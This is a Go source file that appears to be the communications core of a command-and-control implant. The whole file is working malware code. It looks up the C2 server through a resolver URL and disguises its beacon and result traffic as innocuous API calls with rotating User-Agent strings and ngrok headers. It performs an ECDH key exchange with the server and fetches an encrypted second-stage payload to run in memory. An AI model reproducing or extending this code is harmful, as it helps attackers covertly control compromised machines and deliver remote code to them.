package common

import (
	"bytes"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"io"
	"math/big"
	"net/http"
	"time"

	"golang.org/x/crypto/hkdf"
)

var C2Address string
var AgentID string
var ResolverURL string

// Endpoint builds the full URL for a logical message type from the profile.
func Endpoint(kind string) string {
	p := PROFILE.Paths[kind]
	if p == "" {
		switch kind {
		case "handshake":
			p = "/api/v1/auth"
		case "beacon":
			p = "/api/v1/sync"
		case "result":
			p = "/api/v1/telemetry"
		case "stage":
			p = "/api/v1/stage"
		default:
			p = "/"
		}
	}
	return C2Address + p
}

// ProfileHeaders sets a random User-Agent (from the profile pool) plus the
// static profile headers on the request.
func ProfileHeaders(req *http.Request) {
	ua := "Mozilla/5.0"
	if len(PROFILE.UserAgents) > 0 {
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(PROFILE.UserAgents))))
		if err == nil {
			ua = PROFILE.UserAgents[n.Int64()]
		}
	}
	req.Header.Set("User-Agent", ua)
	for k, v := range PROFILE.Headers {
		req.Header.Set(k, v)
	}
}

func ResolveC2() string {
	client := &http.Client{Timeout: 30 * time.Second, Transport: C2Transport}
	resp, err := client.Get(ResolverURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	return string(body)
}

func PerformHandshake() {
	if C2Address == "" {
		C2Address = ResolveC2()
		if C2Address == "" {
			return
		}
	}

	curve := ecdh.P256()
	privKey, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		return
	}
	pubKey := privKey.PublicKey()

	packet := Task{
		Type:      "handshake",
		PublicKey: base64.StdEncoding.EncodeToString(pubKey.Bytes()),
	}
	jsonPacket, err := json.Marshal(packet)
	if err != nil {
		return
	}

	encryptedPacket, err := EncryptStatic(string(jsonPacket))
	if err != nil {
		return
	}

	client := &http.Client{Timeout: 10 * time.Second, Transport: C2Transport}
	req, err := http.NewRequest("POST", Endpoint("handshake"), bytes.NewBuffer([]byte(encryptedPacket)))
	if err != nil {
		return
	}
	ProfileHeaders(req)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AgentID)

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	decryptedResp, err := DecryptStatic(string(bodyBytes))
	if err != nil {
		return
	}

	var handshakeResp HandshakeResponse
	json.Unmarshal([]byte(decryptedResp), &handshakeResp)

	serverPubBytes, err := base64.StdEncoding.DecodeString(handshakeResp.PublicKey)
	if err != nil {
		return
	}
	serverPub, err := curve.NewPublicKey(serverPubBytes)
	if err != nil {
		return
	}

	sharedSecret, err := privKey.ECDH(serverPub)
	if err != nil {
		return
	}

	hkdfReader := hkdf.New(sha256.New, sharedSecret, nil, []byte("handshake data"))
	derivedKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdfReader, derivedKey); err != nil {
		return
	}

	SessionKey = derivedKey
}

// GetStage fetches the in-memory stage from the server. The stage is
// returned AES-GCM-encrypted with the session key established by the
// preceding handshake, so we decrypt it here.
func GetStage() ([]byte, error) {
	client := &http.Client{Timeout: 30 * time.Second, Transport: C2Transport}
	req, err := http.NewRequest("GET", Endpoint("stage"), nil)
	if err != nil {
		return nil, err
	}
	ProfileHeaders(req)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AgentID)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	decrypted, err := Decrypt(string(body))
	if err != nil {
		return nil, err
	}
	return []byte(decrypted), nil
}
